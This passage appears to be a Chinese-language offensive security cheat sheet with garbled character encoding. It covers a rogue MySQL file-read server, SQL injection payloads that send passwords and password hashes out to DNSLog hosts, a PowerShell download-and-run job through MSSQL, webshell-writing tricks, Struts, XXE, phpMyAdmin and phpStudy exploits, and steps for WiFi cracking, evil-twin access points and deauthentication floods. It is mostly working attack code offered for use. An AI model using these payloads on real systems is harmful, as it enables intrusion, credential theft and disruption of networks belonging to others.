å®¢æˆ·ç«¯å¿…é¡»å¯ç”¨LOCAL-INFILE 
å®¢æˆ·ç«¯æ”¯æŒéSSLè¿æ¥
ç›®æ ‡webå­˜åœ¨adminerç­‰å¯æ£€æŸ¥æ•°æ®åº“è¿æ¥çš„è„šæœ¬ã€‚
æ”»å‡»æœºæœ¬åœ°è¿è¡Œpythonæ„é€ å‡mysqlæœåŠ¡ï¼Œä½¿ç”¨ç›®æ ‡webè¿æ¥ï¼Œè¯»å–æ–‡ä»¶ã€‚
#coding=utf-8 
import socket
import logging
logging.basicConfig(level=logging.DEBUG)
filename=&quot;/etc/passwd&quot;
sv=socket.socket()
sv.bind((&quot;&quot;,3305))
sv.listen(5)
conn,address=sv.accept()
logging.info(&#39;Conn from: %r&#39;, address)
conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)
conn.recv(9999)
logging.info(&quot;auth okay&quot;)
conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)
conn.recv(9999)
logging.info(&quot;want file...&quot;)
wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename
conn.sendall(wantfile)
content=conn.recv(9999)
logging.info(content)
conn.close()
</code></pre>
<h4 id="Mysqlå¼€å¯å¤–è¿"><a href="#Mysqlå¼€å¯å¤–è¿" class="headerlink" title="Mysqlå¼€å¯å¤–è¿"></a>Mysqlå¼€å¯å¤–è¿</h4><pre><code>&gt;grant all privileges on user.* to user@&quot;%&quot; identified by &quot;P@ssw0rd&quot;;
</code></pre>
<h4 id="MSSQL-amp-Agent-Jobä¸Šçº¿"><a href="#MSSQL-amp-Agent-Jobä¸Šçº¿" class="headerlink" title="MSSQL&amp;Agent Jobä¸Šçº¿"></a>MSSQL&amp;Agent Jobä¸Šçº¿</h4><pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;syspolicy_purge_now&#39; ; EXEC sp_add_jobstep @job_name = N&#39;syspolicy_purge_now&#39;, @step_name = N&#39;syspolicy_purge_step1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://IP_OR_HOSTNAME/file&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;syspolicy_purge_now &#39;; EXEC dbo.sp_start_job N&#39;syspolicy_purge_now &#39;;
ä½¿ç”¨åœ¨æ³¨å…¥ç‚¹å¤„ï¼Œä½¿ç”¨burpè¿›è¡Œurlç¼–ç ï¼Œç¼–ç åå‰é¢åŠ %20(ç©ºæ ¼URLç¼–ç )
</code></pre>
<h4 id="æ³¨å…¥æ— åˆ—å"><a href="#æ³¨å…¥æ— åˆ—å" class="headerlink" title="æ³¨å…¥æ— åˆ—å"></a>æ³¨å…¥æ— åˆ—å</h4><pre><code>http://url/index.php?id=1 order by 6
http://url/index.php?id=-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
http://url/index.php?id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
</code></pre>
<h4 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h4><pre><code>http://ceye.io
http://www.dnslog.cn/
</code></pre>
<h5 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h5><h6 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h6><pre><code>æ˜¾ç¤ºæ•°æ®åº“
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
æ˜¾ç¤ºæ•°æ®åº“
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit &#123;0&#125;,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
æ˜¾ç¤ºè¡¨
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;dbname&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=0x1x1x2x limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
æ˜¾ç¤ºå­—æ®µ
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
æ˜¾ç¤ºæ•°æ®
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user) from users limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
</code></pre>
<h6 id="MSSQL-2"><a href="#MSSQL-2" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>æŸ¥æ•°æ®
?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test_user where [USER] = &#39;admin&#39;)%2b&#39;.cece.nk40ci.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\&#39;%2b@host%2b&#39;\foobar$&quot;&#39;);
Saå¯†ç 
?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name=&#39;sa&#39;)+&#39;.ip.port.b182oj.ceye.io&#39;;EXEC(&#39;master..xp_dirtree&quot;\&#39;+@host+&#39;\foobar$&quot;&#39;);
æ‰§è¡Œå‘½ä»¤
exec master..xp_cmdshell &quot;whoami&gt;D:/temp%26%26certutil -encode D:/temp D:/temp2%26%26findstr /L /V &quot;&quot;CERTIFICATE&quot;&quot; D:/temp2&gt;D:/temp3&quot;;
exec master..xp_cmdshell &quot;cmd /v /c&quot;&quot;set /p MYVAR=&lt; D:/temp3 %26%26 set FINAL=!MYVAR!.xxx.ceye.io %26%26 ping !FINAL!&quot;&quot;&quot;;
exec master..xp_cmdshell &quot;del &quot;&quot;D:/temp&quot;&quot; &quot;&quot;D:/temp2&quot;&quot; &quot;&quot;D:/temp3&quot;&quot;&quot;;
</code></pre>
<h6 id="postgreSQL"><a href="#postgreSQL" class="headerlink" title="postgreSQL"></a>postgreSQL</h6><pre><code>?id=1;DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (select encode(pass::bytea,&#39;hex&#39;) from test_user where id =1);exec_cmd := E&#39;COPY table_output(content) FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\&#39;&#39;;EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
</code></pre>
<h6 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h6><pre><code>?id=1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;) FROM sys.DUAL;
?id=1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;,80) FROM sys.DUAL;
?id=1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||&#39;.xx.nk40ci.ceye.io&#39;).GETCLOB() FROM sys.DUAL;
?id=1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||&#39;.ddd.nk40ci.ceye.io&#39;) FROM sys.DUAL;
</code></pre>
<h5 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h5><pre><code>&gt;curl http://0ox095.ceye.io/`whoami`
&gt;ping `whoami`.b182oj.ceye.io
&gt;ping %CD%.lfofz7.dnslog.cn 
&amp;
cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;
</code></pre>
<h5 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE"></a>XXE</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % remote SYSTEM &quot;http://b182oj.ceye.io/xxe_test&quot;&gt;
%remote;]&gt;
&lt;root/&gt;
</code></pre>
<h5 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h5><pre><code>xx.action?redirect:http://b182oj.ceye.io/%25&#123;3*4&#125;
xx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;&#39;whoami&#39;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://b182oj.ceye.io/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;
</code></pre>
<h5 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h5><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?operator=http://b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search
</code></pre>
<h5 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h5><pre><code>xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://b182oj.ceye.io/ssrf
</code></pre>
<h5 id="Discuz-1"><a href="#Discuz-1" class="headerlink" title="Discuz"></a>Discuz</h5><pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo
</code></pre>
<h4 id="PHPMyadmin"><a href="#PHPMyadmin" class="headerlink" title="PHPMyadmin"></a>PHPMyadmin</h4><h5 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h5><pre><code>show variables like &#39;%general%&#39;;  #æŸ¥çœ‹é…ç½®
set global general_log = on;  #å¼€å¯general logæ¨¡å¼
set global general_log_file = &#39;/var/www/html/1.php&#39;; 
select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;
</code></pre>
<h5 id="æ…¢æŸ¥è¯¢"><a href="#æ…¢æŸ¥è¯¢" class="headerlink" title="æ…¢æŸ¥è¯¢"></a>æ…¢æŸ¥è¯¢</h5><pre><code>show variables like &#39;%slow%&#39;;
set GLOBAL slow_query_log_file=&#39;C:/WWW/slow.php&#39;;
set GLOBAL slow_query_log=on;
set GLOBAL log_queries_not_using_indexes=on;
select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.db where sleep(10);
</code></pre>
<h5 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h5><pre><code>phpMyAdmin 2.x
POST /scripts/setup.php HTTP/1.1
Host: ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;
</code></pre>
<h5 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h5><pre><code>phpMyAdmin 4.0.1--4.2.12ï¼ŒPHP &lt; 5.3.4
/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00
phpMyAdmin 4.8.0å’Œ4.8.1 åå°æƒé™
&gt;select &#39;&lt;?php phpinfo();exit;?&gt;&#39;
/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_***
</code></pre>
<h5 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h5><pre><code>PhpMyAdmin 4.0.x-4.6.2ï¼ŒPHP 4.3.0-5.4.6åå°æƒé™
&gt;cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#39;ls -lua&#39;);&quot;
phpMyAdmin 4.8.0~4.8.3
CREATE DATABASE foo;
CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );
INSERT INTO foo.bar SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;;
è®¿é—®http://10.1.1.10/chk_rel.php?fixall_pmadb=1&amp;db=foo
INSERT INTO pma__column_infoSELECT &#39;1&#39;, &#39;foo&#39;, &#39;bar&#39;, &#39;baz&#39;, &#39;plop&#39;,
&#39;plop&#39;, &#39;plop&#39;, &#39;plop&#39;,&#39;../../../../../../../../tmp/sess_***&#39;,&#39;plop&#39;;
è®¿é—®
/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1
</code></pre>
<h4 id="PHP-FPM-RCE"><a href="#PHP-FPM-RCE" class="headerlink" title="PHP-FPM RCE"></a>PHP-FPM RCE</h4><pre><code>&gt;git clone https://github.com/neex/phuip-fpizdam.git
&gt;cd phuip-fpizdam
&gt;go get -v &amp;&amp; go build
&gt;go run . http://127.0.0.1/index.php
http://127.0.0.1/index.php?a=id
å¤šæ‰§è¡Œå‡ æ¬¡
</code></pre>
<h4 id="phpstudyåé—¨"><a href="#phpstudyåé—¨" class="headerlink" title="phpstudyåé—¨"></a>phpstudyåé—¨</h4><pre><code>php:5.2.17   5.4.45

GET / HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding:gzip,deflate
Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 2
</code></pre>
<h4 id="cmdhijack"><a href="#cmdhijack" class="headerlink" title="cmdhijack"></a>cmdhijack</h4><pre><code>From: https://hackingiscool.pl/
pocå®Œæ•´çš„å‘½ä»¤è¡Œ
cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;
å¯èƒ½äº§ç”Ÿçš„å½±å“
åŒ…æ‹¬æ‹’ç»æœåŠ¡ï¼Œä¿¡æ¯æ³„éœ²ï¼Œä»»æ„ä»£ç æ‰§è¡Œï¼ˆå–å†³äºç›®æ ‡åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿï¼‰ã€‚
ä»¥webåº”ç”¨ä¸ºä¾‹
</code></pre>
<p><img src="./img/660.png" alt="image"></p>
<pre><code>ç”±äºä½¿ç”¨äº†escapeshellcmd()ï¼Œä¸æ˜“å—å‘½ä»¤æ³¨å…¥çš„å½±å“ï¼Œä½¿ç”¨æœ¬æ–¹æ³•
ä¸€ä¸ªpoc
</code></pre>
<p><img src="./img/661.png" alt="image"><br><img src="./img/662.png" alt="image"></p>
<pre><code>ä¸é™äºä»»ä½•ä½ç½®ï¼Œæ–‡ä»¶
</code></pre>
<p><img src="./img/663.png" alt="image"></p>
<pre><code>å†æ‰©å±•ä¸€ä¸‹ 
å¦‚ï¼Œpowershellå¸¦-encæ‰§è¡Œï¼Œæˆ–mshtaç­‰æ–¹æ³•ï¼Œå¯å‚è€ƒ
https://lolbas-project.github.io/ï¼Œä½†æ˜¯ä¾ç…§windowsçš„ç‰¹æ€§ï¼Œåœ¨æ— æ³•å°†å®Œæ•´å­—ç¬¦ä¸²è§£æä¸ºæœ‰æ•ˆè·¯å¾„çš„æƒ…å†µä¸‹ï¼Œä¼šæ‹†åˆ†ç©ºæ ¼åé¢çš„å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨&amp;ç¬¦å·
å¦‚ï¼š
&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;powershell -enc xxxx&quot;
&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;mshta http://192.168.0.105:8080/xsuUEWJ.hta&quot;
</code></pre>
<p><img src="./img/664.png" alt="image"></p>
<h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><h4 id="MSSQL-3"><a href="#MSSQL-3" class="headerlink" title="MSSQL"></a>MSSQL</h4><pre><code>åˆ¤æ–­æ•°æ®åº“
;and (select count(*) from sysobjects)&gt;0 mssql
;and (select count(*) from msysobjects)&gt;0 access
æŸ¥åº“
?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)&gt;0 --
?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in (&#39;master&#39;))&gt;0 --
æŸ¥è¡¨
import requests
import re

table_list = [&#39;&#39;]

def get_sqlserver_table(table_list, table_num):
    for num in range(0,table_num):
        # print(&quot;&#39;,&#39;&quot;.join(table_list))
        sql_str = &quot;and (select top 1 name from [xxxx].sys.all_objects where type=&#39;U&#39; AND is_ms_shipped=0 and name not in (&#39;&#123;&#125;&#39;))&gt;0&quot;.format(&quot;&#39;,&#39;&quot;.join(table_list))
        url = &quot;http://www.xxxxx.cn/x.aspx?cid=1&#39; &#123;&#125; AND &#39;aNmV&#39;=&#39;aNmV&quot;.format(sql_str)
        r = requests.get(url, headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&#39;&#125;)
        res = re.search(r&#39;\&#39;(.*)\&#39;&#39;, r.content.decode(&#39;utf-8&#39;),  re.M|re.I)
        table_name = str(res.group(1))
        table_list.append(table_name)
        print(&quot;[&#123;&#125;] - TableName: &#123;&#125;&quot;.format(str(r.status_code), table_name))
if __name__ == &quot;__main__&quot;:
    get_sqlserver_table(table_list, 16)

åˆ¤æ–­æ˜¯å¦å­˜åœ¨xp_cmdshell
and 1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)
æ‰§è¡Œå‘½ä»¤
;exec master..xp_cmdshell &quot;net user name password /add&quot;â€”
æŸ¥çœ‹æƒé™
and (select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))=1--  //sa
and (select IS_MEMBER(&#39;db_owner&#39;))=1--   //  dbo
and (select IS_MEMBER(&#39;public&#39;))=1--  //public
ç«™åº“åˆ†ç¦»è·å–æœåŠ¡å™¨IP
;insert into OPENROWSET(&#39;SQLOLEDB&#39;,&#39;uid=sa;pwd=xxx;Network=DBMSSOCN;Address=ä½ çš„ip,80;&#39;, &#39;select * from dest_table&#39;) select * from src_table;--
LOGå¤‡ä»½
;alter database testdb set RECOVERY FULL --
;create table cmd (a image) --
;backup log testdb to disk = &#39;c:\wwwroot\shell.asp&#39; with init --
;insert into cmd (a) values (&#39;&lt;%%25Execute(request(&quot;chopper&quot;))%%25&gt;&#39;)-- 
;backup log testdb to disk = &#39;c:\wwwroot\shell.asp&#39; â€“
2000å·®å¼‚å¤‡ä»½
;backup database testdb to disk =&#39;c:\wwwroot\bak.bak&#39;;--
;create table [dbo].[testtable] ([cmd] [image]);--
;insert into testtable (cmd) values(æœ¨é©¬hexç¼–ç );--
;backup database testdb to disk=&#39;c:\wwwroot\upload\shell.asp&#39; WITH DIFFERENTIAL,FORMAT;--
2005å·®å¼‚å¤‡ä»½
;alter/**/database/**/[testdb]/**/set/**/recovery/**/fullâ€”
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
;create/**/table/**/[itpro]([a]/**/image)â€”
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
;insert/**/into/**/[itpro]([a])/**/values(æœ¨é©¬hexç¼–ç )â€”
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=æœ¨é©¬ä¿å­˜è·¯å¾„çš„SQL_ENç¼–ç /**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
;drop/**/table/**/[itpro]â€”
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
</code></pre>
<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><pre><code>è¿æ¥
&gt;psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432
æŸ¥çœ‹ç‰ˆæœ¬
&gt;select version();
åˆ—å‡ºæ•°æ®åº“
&gt;select datname from pg_database;
åˆ—å‡ºæ‰€æœ‰è¡¨å
&gt;select * from pg_tables;
è¯»å–è´¦å·ç§˜å¯†
&gt;select usename,passwd from pg_shadow;
å½“å‰ç”¨æˆ·
&gt;select user;
ä¿®æ”¹å¯†ç 
&gt;alter user postgres with password &#39;123456&#39;;
åˆ—ç›®å½•
&gt;select pg_ls_dir(&#39;/etc&#39;);
è¯»æ–‡ä»¶
&gt;select pg_read_file(&#39;postgresql.auto.conf&#39;,0,100); #è¡Œæ•°
&amp;
&gt;drop table wooyun;
&gt;create table wooyun(t TEXT);
&gt;copy wooyun FROM &#39;/etc/passwd&#39;;
&gt;select * from wooyun limit 1 offset 0;
&amp;
&gt;select lo_import(&#39;/etc/passwd&#39;,12345678);
&gt;select array_agg(b)::text::int from(select encode(data,&#39;hex&#39;)b,pageno from pg_largeobject where loid=12345678 order by pageno)a;
å†™æ–‡ä»¶
create table shell(shell text not null);
insert into shell values($$&lt;?php @eval($_POST[1]);?&gt;$$);
copy shell(shell) to &#39;/var/www/html/shell.php&#39;;
&amp;
copy (select &#39;&lt;?php phpinfo();?&gt;&#39;) to &#39;/var/www/html/shell.php&#39;;
çˆ†ç ´
MSF&gt;use auxiliary/scanner/postgres/postgres_login
æ‰§è¡Œå‘½ä»¤ç‰ˆæœ¬8.2ä»¥ä¸‹
&gt;create function system(cstring) returns int AS &#39;/lib/libc.so.6&#39;, &#39;system&#39; language C strict;
&gt;create function system(cstring) returns int AS &#39;/lib64/libc.so.6&#39;, &#39;system&#39; language C strict;
&gt;select system(&#39;id&#39;);
</code></pre>
<h2 id="è¿‘æºæ”»å‡»"><a href="#è¿‘æºæ”»å‡»" class="headerlink" title="è¿‘æºæ”»å‡»"></a>è¿‘æºæ”»å‡»</h2><h3 id="WI-FIç ´è§£"><a href="#WI-FIç ´è§£" class="headerlink" title="WI-FIç ´è§£"></a>WI-FIç ´è§£</h3><h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><pre><code>Kaliä¸‹å·¥å…·wifiteï¼ŒåŠ è½½ç½‘å¡ï¼Œå¼€å¯ç›‘å¬æ¨¡å¼ï¼Œ#airmon-ng check kill
#airmon-ng start wlan1
å®‰è£…hcxtools v4.2.0æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œhcxdumptool v4.2.0æˆ–æ›´é«˜ç‰ˆæœ¬
#apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
#git clone https://github.com/ZerBea/hcxtools
#cd hcxtools
#make
#make install 
#git clone https://github.com/ZerBea/hcxdumptool
#cd hcxdumptool
#make
#make install
#wifite â€“-dict /root/Desktop/wordlist.txt  åŠ è½½
</code></pre>
<h4 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h4><pre><code>#airmon-ng start wlan0 å¼€å¯ç›‘å¬æ¨¡å¼
#airodump-ng wlan0mon  æŸ¥çœ‹æ•°æ®åŒ…
#airodump-ng â€“c 1 â€“bssid APmac â€“w name wlan1monä¿å­˜æŸAPæ•°æ®åŒ…
#aireplay-ng â€“deauth 10 â€“a APmac wlan0mon  deauthæ”»å‡»
#aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon deauthæ”»å‡»æŸä¸ªè®¾å¤‡ç›´è‡³è·å–handshake(æ¡æ‰‹åŒ…)
#airmon-ng stop wlan0mon  å…³é—­ç›‘å¬æ¨¡å¼
#aircrack-ng â€“w wordlist.txt name.cap æŒ‡å®šå­—å…¸ç ´è§£å¯†ç 
</code></pre>
<h3 id="é’“é±¼ç½‘ç»œ"><a href="#é’“é±¼ç½‘ç»œ" class="headerlink" title="é’“é±¼ç½‘ç»œ"></a>é’“é±¼ç½‘ç»œ</h3><h4 id="Hostapd"><a href="#Hostapd" class="headerlink" title="Hostapd"></a>Hostapd</h4><pre><code>#apt install hostapd dnsmasq
#cd /etc/hostapd
#vim open.conf åˆ›å»ºæ— åŠ å¯†çƒ­ç‚¹
Interface=wlan1
Ssid=FreeWIFI
Driver=nl80211
Channel=1
Hw_mode=g

#vim /etc/dnsmasq.conf
Dhcp-range=10.0.0.1, 10.0.0.255,12h
Interface=wlan1

#systemctl restart dnsmasq
æ¶ˆé™¤ç½‘å¡é™åˆ¶
#nmcli radio wifi off
#rfkill unblock wlan
#ifconfig wlan1 10.0.0.1/24
#hostapd open.conf
å—…æ¢
#sysctl â€“w net.ipv4.ip_forward=1
#iptables â€“t nat â€“A POSTROUTING â€“o ç½‘å¡ â€“j MASQUERADE
#bettercap â€“iface wlan1
#net.show
#net.sniff on
#driftnet â€“i wlan1
</code></pre>
<h4 id="Hostapd-wpe"><a href="#Hostapd-wpe" class="headerlink" title="Hostapd-wpe"></a>Hostapd-wpe</h4><pre><code>#apt install hostapd-wpe
#vim /etc/hostapd-wpe/hostapd-wpe.conf
é…ç½®interface=wlan1
Ssid=
Channel=
è¯ä¹¦ä¿®æ”¹
#cd /etc/hostapd-wpe/certs/
æ–‡ä»¶ca.cnf server.cnf client.cnf
ä¿®æ”¹countrName stateOrProvinceName localityName â€¦â€¦.
#rm â€“rf *.pem *.der *.csr *.crt *.key *.p12 serial* index.txt*
#make clean
#./bootstrap
#make install
æ‰§è¡Œåˆ›å»ºçƒ­ç‚¹
#hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
è·å–åˆ°å¯†ç æ—¶ä½¿ç”¨asleepç ´è§£
#asleap â€“C Challengeå€¼ â€“R responseå€¼ â€“W å­—å…¸æ–‡ä»¶
</code></pre>
<h3 id="æ— çº¿å¹²æ‰°"><a href="#æ— çº¿å¹²æ‰°" class="headerlink" title="æ— çº¿å¹²æ‰°"></a>æ— çº¿å¹²æ‰°</h3><h4 id="Beacon-flood"><a href="#Beacon-flood" class="headerlink" title="Beacon flood"></a>Beacon flood</h4><pre><code>éœ€åˆ‡æ¢ç½‘å¡ä¸ºç›‘å¬æ¨¡å¼
#airmon-ng start wlan1
åˆ›å»ºå¤§é‡è™šå‡çƒ­ç‚¹Mdk3 mon0 b
#mdk3â€‚wlan1monâ€‚bâ€‚-f /root/wifi.txt -a -s 1500
</code></pre>
<h4 id="Deauth-flood"><a href="#Deauth-flood" class="headerlink" title="Deauth flood"></a>Deauth flood</h4><pre><code>é’ˆå¯¹AP
#airmon-ng start wlan1
#aireplay-ng â€“deauth 10 â€“a APâ€™s mac address mon0
é’ˆå¯¹APå†…è®¾å¤‡
#airmon-ng start wlan1       å°†ç½‘å¡ç½®ä¸ºç›‘å¬æ¨¡å¼
#airodump-ng wlan1mon â€“bssid ç›®æ ‡apçš„ssid
#aireplay-ng -0 0 -a apçš„ssid -c APçš„ssid wlan0mon å¼€å§‹æ”»å‡»
</code></pre>
<h4 id="Mdk3-destruction"><a href="#Mdk3-destruction" class="headerlink" title="Mdk3 destruction"></a>Mdk3 destruction</h4><pre><code>é’ˆå¯¹èŒƒå›´å†…
#mdk3 wlan1mon d
é’ˆå¯¹AP
#airodump-ng wlan1mon
#mdk3 wlan1mon a -a APmac å‘èµ·æ”»å‡»
é»‘åå•
#mdk3 wlan1mon d â€“c ä¿¡é“ â€“b /blacklist.txt.
#mdk3 wlan1mon  b -n test -w -g -c 1 -s 200
</code></pre>
